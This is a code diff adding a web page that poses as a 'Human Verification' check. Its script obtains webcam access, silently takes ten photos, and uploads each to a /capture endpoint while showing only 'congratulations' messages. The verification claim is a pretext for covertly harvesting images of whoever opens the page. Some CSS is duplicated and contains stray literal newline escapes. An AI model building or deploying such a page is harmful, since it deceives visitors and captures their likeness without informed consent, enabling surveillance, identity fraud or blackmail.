@@ -1,0 +1,260 @@
+<!doctype html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Human Verification Lab</title>
+<style>
+*{box-sizing:border-box}
+
+body{
+  font-family:system-ui,-apple-system,sans-serif;
+  background:#0d0f14;
+  color:#eee;
+  display:grid;
+  place-items:center;
+  min-height:100vh;
+  margin:0;
+  padding:20px;
+}
+
+.card{
+  width:min(92%,440px);
+  padding:24px;
+  border:1px solid #292d38;
+  border-radius:16px;
+  text-align:center;
+  background:#11141b;
+  box-shadow:0 18px 50px rgba(0,0,0,.35);
+  animation:cardIn .6s ease-out;
+}
+
+video{
+  width:100%;
+  border-radius:12px;
+  margin-top:15px;
+  display:none;
+}
+
+button{
+  padding:12px 18px;
+  margin:8px 4px;
+  border:0;
+  border-radius:10px;
+  font-weight:700;
+  cursor:pointer;
+  transition:transform .18s ease,box-shadow .18s ease;
+}
+
+button:hover{
+  transform:translateY(-2px);
+  box-shadow:0 8px 22px rgba(255,255,255,.08);
+}
+
+button:active{
+  transform:scale(.97);
+}
+
+#capture,#stop{
+  display:none;
+}
+
+.status-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:#aaa;margin-right:8px;animation:statusPulse 1.4s ease-in-out infinite}\n\n#status{
+  margin:12px 0;
+  color:#aaa;
+  animation:pulse 2s ease-in-out infinite;
+}
+
+@keyframes cardIn{
+  from{opacity:0;transform:translateY(14px)}
+  to{opacity:1;transform:translateY(0)}
+}
+
+@keyframes statusPulse{0%,100%{opacity:.3;transform:scale(.8)}50%{opacity:1;transform:scale(1.15)}}\n\n@keyframes pulse{
+  0%,100%{opacity:.65}
+  50%{opacity:1}
+}
+
+@media(max-width:500px){
+  .card{
+    width:100%;
+    padding:22px 16px;
+  }
+}
+</style>
+
+<style>
+body{
+  overflow:hidden;
+  background:
+    radial-gradient(circle at 20% 20%, #302060 0, transparent 35%),
+    radial-gradient(circle at 80% 80%, #164d5c 0, transparent 35%),
+    #0d0d14;
+}
+
+.card{
+  position:relative;
+  animation:cardIn .7s ease-out;
+  box-shadow:0 0 40px rgba(120,100,255,.18);
+  backdrop-filter:blur(10px);
+}
+
+.card::before,
+.card::after{
+  content:"";
+  position:absolute;
+  width:70px;
+  height:70px;
+  border-radius:50%;
+  border:1px solid rgba(255,255,255,.08);
+  animation:float 4s ease-in-out infinite;
+  pointer-events:none;
+}
+
+.card::before{
+  top:-35px;
+  left:-35px;
+}
+
+.card::after{
+  right:-35px;
+  bottom:-35px;
+  animation-delay:1.5s;
+}
+
+button{
+  transition:transform .2s ease,box-shadow .2s ease;
+}
+
+button:hover{
+  transform:translateY(-2px) scale(1.02);
+  box-shadow:0 8px 25px rgba(100,100,255,.25);
+}
+
+button:active{
+  transform:scale(.97);
+}
+
+.status-dot{display:inline-block;width:7px;height:7px;border-radius:50%;background:#aaa;margin-right:8px;animation:statusPulse 1.4s ease-in-out infinite}\n\n#status{
+  animation:pulse 2s ease-in-out infinite;
+}
+
+@keyframes cardIn{
+  from{opacity:0;transform:translateY(20px) scale(.97)}
+  to{opacity:1;transform:translateY(0) scale(1)}
+}
+
+@keyframes float{
+  0%,100%{transform:translate(0,0)}
+  50%{transform:translate(12px,-15px)}
+}
+
+@keyframes statusPulse{0%,100%{opacity:.3;transform:scale(.8)}50%{opacity:1;transform:scale(1.15)}}\n\n@keyframes pulse{
+  0%,100%{opacity:.65}
+  50%{opacity:1}
+}
+</style>
+</head>
+<body>
+<main class="card">
+  <h2>Human Verification</h2>
+  <p>Complete the verification to continue.</p>
+
+  <button id="start">Start Verification</button>
+  <button id="capture">Welcome Hell🔥</button>
+
+  <video id="video" autoplay playsinline></video>
+  <div id="status"><span class="status-dot"></span><span id="statusText">Ready.</span></div>
+</main>
+
+<script>
+const start = document.querySelector("#start");
+const capture = document.querySelector("#capture");
+const video = document.querySelector("#video");
+const status = document.querySelector("#status");
+
+let stream = null;
+
+start.onclick = async () => {
+  try {
+    stream = await navigator.mediaDevices.getUserMedia({video:true});
+    const track = stream.getVideoTracks()[0];
+    video.srcObject = stream;
+    await video.play();
+
+    start.style.display = "none";
+    capture.style.display = "inline-block";
+    status.textContent = "Processing…";
+  } catch (error) {
+    status.textContent = `Verification failed: ${error.name}`;
+  }
+};
+
+capture.onclick = async () => {
+  if (!stream || video.videoWidth === 0 || video.videoHeight === 0) {
+    status.textContent = "Camera is not ready.";
+    return;
+  }
+
+  capture.disabled = true;
+
+  try {
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+
+    const ctx = canvas.getContext("2d");
+    if (!ctx) throw new Error("Canvas is unavailable.");
+
+    for (let i = 1; i <= 10; i++) {
+      ctx.drawImage(
+        video,
+        0,
+        0,
+        canvas.width,
+        canvas.height
+      );
+
+      const blob = await new Promise((resolve, reject) => {
+        canvas.toBlob(
+          blob => blob
+            ? resolve(blob)
+            : reject(new Error("JPEG conversion failed.")),
+          "image/jpeg",
+          0.9
+        );
+      });
+
+      const form = new FormData();
+      form.append(
+        "photo",
+        blob,
+        `capture-${i}-${Date.now()}.jpg`
+      );
+
+      const response = await fetch("/capture", {
+        method: "POST",
+        body: form
+      });
+
+      if (!response.ok) {
+        throw new Error(`Upload ${i} failed: HTTP ${response.status}`);
+      }
+
+      status.textContent = `${i} congratulations`;
+
+      if (i < 10) {
+        await new Promise(resolve => setTimeout(resolve, 600));
+      }
+    }
+
+    status.textContent = "Congratulations";
+  } catch (error) {
+    status.textContent = `Capture failed: ${error.message}`;
+  } finally {
+    capture.disabled = false;
+  }
+};
+</script>
+</body>
+</html>
